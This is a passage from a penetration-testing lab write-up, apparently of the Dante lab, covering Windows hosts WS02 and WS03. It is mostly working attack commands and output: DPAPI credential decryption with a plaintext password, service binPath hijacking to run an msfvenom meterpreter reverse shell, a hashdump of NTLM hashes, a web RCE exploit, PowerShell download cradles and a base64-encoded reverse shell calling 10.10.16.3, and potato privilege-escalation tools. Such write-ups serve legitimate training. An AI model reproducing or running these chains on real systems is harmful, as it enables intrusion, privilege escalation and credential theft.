-a-hs-        7/13/2020   6:06 AM          11152 DFBE70A7E5CC19A398EBF1B96859CE5D

```

Let’s download that. Convert to base64 then decode it on host:

```bash
#on target
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\DFBE70A7E5CC19A398EBF1B96859CE5D"))

#on host
echo 'b64_blob...' | base64 -d > DFBE70A7E5CC19A398EBF1B96859CE5D
```

Let’s use pypykatz to describe the blob so we know which master was used to encrypt it:

```bash
pypykatz dpapi describe credential DFBE70A7E5CC19A398EBF1B96859CE5D

<SNIP>
masterkey_guid: 5bc96c14-a85d-45d7-8568-80ff29215ca4
```

Now let’s get the master key to decrypt it:

```bash
cd C:\Users\dharding\Appdata\Roaming\Microsoft\Protect\S-1-5-21-3529848291-2371357972-1873374923-1001

[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\5bc96c14-a85d-45d7-8568-80ff29215ca4"))

```

Now decode:

```bash
echo 'AgAAAAAAAAAAAAAANQBiAGMAOQA2AGMAMQA0AC0AYQA4ADUAZAAtADQANQBkADcALQA4ADUANgA4AC0AOAAwAGYAZgAyADkAMgAxADUAYwBhADQAAACpb+kDAAAFAAAAsAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAA1WxC3qp+lqcqhwKX2LfSk0AfAAAOgAAAEGYAAIIV8p7W/3ORalhFaIAjSKeFhaY1HZ98eUhfu8Rn+C/9LZmp84ptd3EuaypfNx9QAu1AQYaLqd6NstUQMH53NpqIbr/ujoMgHPdxrT88mEP1ya+47Ir/FDTxxwtH4s+qU5IKZT5iFb9e1H1ZpsaN2UUTWxtdnEQzt7howU0xQieKVP9NbZCWt/Mm1hLtgcua3wIAAAA+/zlZ5IXpA6612bqPpBpyQB8AAA6AAAAQZgAAOXV+avMTI330oDb7w2ak1ioz6Z+e7e1FgWpZ2i3dj7WwMWWtQcaKYPjg3f2ESRSj2qAkXfUD6592KajDEPZ3kFnHY5MnVWlWPXKGhQzmWNd5lyWoYzNbplEMBc7u2dSS1RwG+b7yT9EPcWB60DFXoAMAAAASkR1LBpFcQrfJDiSPZakj' | base64 -d > 5bc96c14-a85d-45d7-8568-80ff29215ca4
```

Now, since we know our password, let’s generate our pre-key:

```bash
pypykatz dpapi prekey password 'S-1-5-21-3529848291-2371357972-1873374923-1001' 'WestminsterOrange17' > prekey_file
```

Now let’s decrypt our master key:

```bash
pypykatz dpapi masterkey 5bc96c14-a85d-45d7-8568-80ff29215ca4 prekey_file -o mkf
```

Now let’s decrypt the DPAPI blob:

```bash
pypykatz dpapi credential mkf DFBE70A7E5CC19A398EBF1B96859CE5D

username : 02tvpreerqrcmejq
<SNIP>
```

Weird output.

Now we upload winpeas.exe and analyse the output:

```bash
upload winpeas.exe 

.\winpeas.exe
```

```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies                                                                                                                 
È Check for a possible brute-force                                                                                                             
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: DANTE-WS02
    SID: S-1-5-21-3529848291-2371357972-1873374923
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
    
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports                                                                                                       
È Check for services restricted from the outside                                                                                               
  Enumerating IPv4 connections                                                                                                                 
                                                                                                                                               
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name          
                                                                                                                                               
  TCP        0.0.0.0               21            0.0.0.0               0               Listening         2592            FileZilla Server      
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         900             svchost               
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System                
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         4124            svchost               
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System                
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System                
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         656             lsass                 
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         512             wininit               
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1056            svchost               
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1416            svchost               
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2200            spoolsv               
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         640             services              
  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         2420            svchost               
  TCP        127.0.0.1             14147         0.0.0.0               0               Listening         2592            FileZilla Server      
  TCP        172.16.1.101          139           0.0.0.0               0               Listening         4               System
```

Let’s check program files:

```bash
dir "C:\Program Files"
```

![image.png]({{ site.baseurl }}/assets/dante/image%20101.png)

Let’s also check the x86 one. We find an interesting Folder IOBit.

```bash
cd "C:\Program Files (x86)\IObit\IObit Uninstaller"

type History.txt

What's new in IObit Uninstaller                                                                                                                
                                                                                                                                               
v9.5                                                                   
+ Install Monitor is free to all users to automatically log all changes made to your system during the program installation
+ Improved leftover scanning algorithms to scan for more leftovers after the program uninstallation
+ Fixed the occasional failure of uninstalling Steam games
+ New language added: Indonesian
+ Fixed known bugs  
<SNIP>
```

We have the version of IObit. Let’s search for exploits.

We find an unquoted service path vulnerability allowing a user to gain SYSTEM privilege:

https://www.exploit-db.com/exploits/48543

from winpeas output, we search for unquoted:

```bash
    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{10921475-03CE-4E04-90CE-E2E7EF20C814}             
    Folder: C:\Program Files (x86)\IObit\IObit Uninstaller                                                                                     
    File: C:\Program Files (x86)\IObit\IObit Uninstaller\UninstallExplorer.dll (Unquoted and Space detected) - C:\         
```

```bash
sc.exe qc IObitUnSvr

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: IObitUnSvr
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   :
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : IObit Uninstaller Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

Now we need to make sure we have write permission to `C:\Program Files (x86)\IObit`

We can attempt to write a file there:

```bash
cd "C:\Program Files (x86)\IObit"
```

We download accesschk from microsoft official website:

https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

Now upload it and check the permission of the directory:

```bash
C:\Programdata\accesschk.exe -d "C:\Program Files (x86)\IObit"

C:\Program Files (x86)\IObit
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  BUILTIN\Users
  R  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES
  R  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES
```

We do not have write permission in path.

Check permission on the service:

```bash
C:\Programdata\accesschk.exe /accepteula -ucqv IObitUnSvr
```

Denied. We need special permission. We can download Get-ServiceAcl.ps1 from here https://gist.github.com/cube0x0/1cdef7a90473443f72f28df085241175

Now upload the ps script and import it:

```bash
Import-Module .\Get-ServiceAcl.ps1

File C:\programdata\Get-ServiceAcl.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ .\Get-ServiceAcl.ps1
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess

```

Let’s just download it straight to memeory:

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/Get-ServiceAcl.ps1')
```

Now execute:

```bash
"IObitUnSvr" | Get-ServiceAcl | select -ExpandProperty Access

```

![image.png]({{ site.baseurl }}/assets/dante/image%20102.png)

In ServiceRights, it shows we have permission to start and stop a service. We also have permission to ChangeConfig, where we can update the BINARY_PATH_NAME to a path of our choosing. We can generate a meterpreter reverse shell with msfvenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o rev.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe

```

Now let’s upload our binary and change the binary path:

```bash
wget http://10.10.16.3/rev.exe -o rev.exe
```

```bash
sc.exe config IObitUnSvr binPath="cmd.exe /c C:\programdata\rev.exe"

[SC] ChangeServiceConfig SUCCESS
```

Now start our listener:

```bash
msfconsole
use exploit/multi/handler
set lhost tun0
set lport 4444
set payload windows/x64/meterpreter/reverse_tcp
run
```

Now stop and start service:

```bash
sc.exe stop IObitUnSvr
sc.exe start IObitUnSvr
```

We now have SYSTEM shell:

![image.png]({{ site.baseurl }}/assets/dante/image%20103.png)

```bash
meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
dharding:1001:aad3b435b51404eeaad3b435b51404ee:9a64e3e730594630f571ee71c6a9661b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1002:aad3b435b51404eeaad3b435b51404ee:06002020e60e9ec6865e40776629c273:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2e68a3ca340652eb2107a49d2d1b8049:::
```

Now let’s winrm on as Administrator.

In their /Documents folder, we find a sshd_config.txt:

```bash
# Example of overriding settings on a per-user basis
#Match User anoncvs
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

Match Group administrators
       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
```

Let’s go to this directory.

```bash
cd C:\Programdata\ssh

dir

d-----        7/28/2020  12:06 AM                logs
-a----        7/28/2020  12:15 AM              6 sshd.pid
-a----         3/1/2019   4:30 PM           2253 sshd_config
-a----        7/28/2020  12:06 AM            668 ssh_host_dsa_key
-a----        7/28/2020  12:06 AM            621 ssh_host_dsa_key.pub
-a----        7/28/2020  12:06 AM            227 ssh_host_ecdsa_key
-a----        7/28/2020  12:06 AM            193 ssh_host_ecdsa_key.pub
-a----        7/28/2020  12:06 AM            432 ssh_host_ed25519_key
-a----        7/28/2020  12:06 AM            113 ssh_host_ed25519_key.pub
-a----        7/28/2020  12:06 AM           1675 ssh_host_rsa_key
-a----        7/28/2020  12:06 AM            413 ssh_host_rsa_key.pub

```

These are just host keys used exclusively by an ssh server running on this machine. We also know the service is stopped:

```bash
Get-Service sshd

Status   Name               DisplayName
------   ----               -----------
Stopped  sshd               OpenSSH SSH Server
```

## 172.16.1.102 DANTE-WS03

```bash
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5985/tcp  open  wsman
33060/tcp open  mysqlx
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
MAC Address: 00:50:56:94:77:DB (Unknown)

sudo nmap -sC -sV -oN nmap/dante-ws03 172.16.1.102

80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
|_http-title: Dante Marriage Registration System :: Home Page
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
|_http-title: Dante Marriage Registration System :: Home Page
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
| ssl-cert: Subject: commonName=localhost/organizationName=TESTING CERTIFICATE
| Subject Alternative Name: DNS:localhost
| Not valid before: 2022-06-24T01:07:25
|_Not valid after:  2022-12-24T01:07:25
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: DANTE-WS03
|   NetBIOS_Domain_Name: DANTE-WS03
|   NetBIOS_Computer_Name: DANTE-WS03
|   DNS_Domain_Name: DANTE-WS03
|   DNS_Computer_Name: DANTE-WS03
|   Product_Version: 10.0.19041
|_  System_Time: 2025-11-06T13:55:35+00:00
|_ssl-date: 2025-11-06T13:55:46+00:00; +7s from scanner time.
| ssl-cert: Subject: commonName=DANTE-WS03
| Not valid before: 2025-11-05T08:38:39
|_Not valid after:  2026-05-07T08:38:39
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

hostname:

```bash
proxychains -q nxc smb 172.16.1.102 -u '' -p '' --shares

SMB         172.16.1.102    445    DANTE-WS03       [*] Windows 10 / Server 2019 Build 19041 x64 (name:DANTE-WS03) (domain:DANTE-WS03) (signing:False) (SMBv1:False)
SMB         172.16.1.102    445    DANTE-WS03       [-] DANTE-WS03\: STATUS_ACCESS_DENIED 
SMB         172.16.1.102    445    DANTE-WS03       [-] Error enumerating shares: Error while reading from remote

```

### Foothold WS03

Let’s visit the web page:

```bash
http://172.16.1.102
```

![image.png]({{ site.baseurl }}/assets/dante/image%20104.png)

There are two login forms. One in /admin/login.php, one in /user/login.php. Both look the same:

![image.png]({{ site.baseurl }}/assets/dante/image%20105.png)

We also have an option to register. Let’s search up the framework Online Marriage Registration System exploit. 

We find a RCE on exploit-db: https://www.exploit-db.com/exploits/49557 

Let’s download the exploit and try it out.

```bash
python3 script.py -u http://172.16.1.102:80/ -c 'whoami' 

[+] Registered with mobile phone 295114141 and password 'dante123'
[+] PHP shell uploaded
[+] Command output
dante-ws03\blake

```

Let’s get a reverse shell. Let’s use the same ConPtyShell we used for WS01, which bypasses anti-virus.

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Now let’s execute our script:

```bash
#on attack
python3 -m http.server 80

python3 script.py -u http://172.16.1.102:80/ -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/temp.ps1')" 

#Or we could URL encode nishang one liner

python3 script.py -u http://172.16.1.102:80/ -c "powershell+-EncodedCommand+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2bACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA"
```

![image.png]({{ site.baseurl }}/assets/dante/image%20106.png)

We now have shell.

### Privilege Escalation WS03

We have SeImpersonatePrivilege. This is normally vulnerable to potato exploits. Let’s find out the system version to decide which potato exploit we will use. 

```bash
systeminfo

Host Name:                 DANTE-WS03     
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
<SNIP>
```

The Windows version with the build number 10.0.19042 corresponds to Windows 10, version 20H2 (also known as the October 2020 Update).

Let’s try juicypotato-ng. We can download from here: https://github.com/antonioCoco/JuicyPotatoNG/releases

Now let’s create our reverse shell script, put it in a file e.g. run.bat.

```bash
powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```

Now upload JuicyPotatoNG.exe

```bash
wget http://10.10.16.3/JuicyPotatoNG.exe -o jp.exe
wget http://10.10.16.3/run.bat -o run.bat
```

Now let’s start listener:

```bash
nc -lnvp 4444
```

Execute:

```bash
.\jp.exe -t * -p C:\Users\sqlsvc\Desktop\rev.bat
```

Failed. 

Let’s try roguepotato:

[https://github.com/antonioCoco/RoguePotato/releases](https://github.com/antonioCoco/RoguePotato/releases)

Now just unzip, transfer the exploit:

```bash
wget http://10.10.16.3/RoguePotato.exe -o rp.exe
wget http://10.10.16.3/nc.exe -o nc.exe
```

Now execute:

```bash
.\rp.exe -e ".\run.bat" -r 10.10.16.3

.\rp.exe -r 10.10.16.3 -l 9999 -e ".\run.bat"

.\rp.exe -r 10.10.16.3 -e "\\10.10.16.7\share\nc.exe 10.10.16.3 4444 -e cmd.exe" -l 9999 
```

None worked. 

Let’s try GodPotato: https://github.com/BeichenDream/GodPotato/releases

```bash
wget http://10.10.16.3/GodPotato-NET4.exe -o gp.exe
```

Now try:

```bash
.\gp.exe -cmd "cmd /c whoami"

<SNIP>
nt authority\system

```

It worked. Let’s get a reverse shell back:

```bash
.\gp.exe -cmd "cmd /c C:\programdata\run.bat"
```

We now have SYSTEM shell:

![image.png]({{ site.baseurl }}/assets/dante/image%20107.png)